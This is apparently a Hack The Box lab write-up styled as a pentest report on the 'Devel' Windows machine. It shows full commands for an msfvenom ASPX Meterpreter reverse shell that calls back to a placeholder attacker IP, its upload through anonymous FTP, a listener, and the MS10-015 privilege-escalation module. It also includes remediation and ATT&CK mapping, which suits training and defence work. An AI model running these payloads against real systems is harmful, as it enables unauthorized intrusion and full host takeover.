# Penetration Test Report — Devel

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-anonymous%20FTP%20%2F%20MS10--015-red)

## Executive Summary

An authorized assessment of `target.htb` identified an **anonymous FTP login with read/write access to the IIS webroot**. A malicious ASPX payload was uploaded and executed via the web server, yielding a Meterpreter session as the IIS user. The unpatched **MS10-015 (KiTrap0D)** vulnerability was then exploited to escalate to `NT AUTHORITY\SYSTEM` — full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous FTP with write access into the IIS webroot | Critical |
| 2 | Missing patch MS10-015 (KiTrap0D) | High |

## Technical Walkthrough

### 1. Enumeration

```bash
nmap -sC -sV target.htb
```

Microsoft FTP (21) and IIS (80). Directory enumeration returned nothing; FTP was the likely vector.

### 2. Foothold — FTP → ASPX Upload

Anonymous FTP login succeeded **with read/write privileges in the IIS directory**. An ASPX reverse shell was generated and uploaded:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f aspx > devel.aspx

ftp target.htb
ftp> put devel.aspx
```

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <port>
run
```

Browsing to `http://target.htb/devel.aspx` triggered the shell. Working directory moved to `C:\Windows\TEMP` (writable — required by many local privilege-escalation modules).

### 3. Privilege Escalation — MS10-015

`sysinfo` showed an **x86** target, making `local_exploit_suggester` reliable:

```
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

`bypassuac_eventvwr` failed (IIS user is not an administrator — expected). The second candidate succeeded:

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <id>
run
```

Flags: `C:\Users\babis\Desktop\user.txt.txt` and `C:\Users\Administrator\Desktop\root.txt.txt`.

## Remediation

- Disable anonymous FTP; never grant write access into webroots; separate upload paths from executable paths.
- Apply MS10-015 and retire end-of-life Windows versions; enable patch management.
- Remove script execution from upload directories; enforce content-type validation.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 / T1078 — anonymous FTP into webroot |
| Execution | T1505.003 — Web Shell (ASPX) |
| Privilege Escalation | T1068 — Exploitation for Privilege Escalation (MS10-015) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
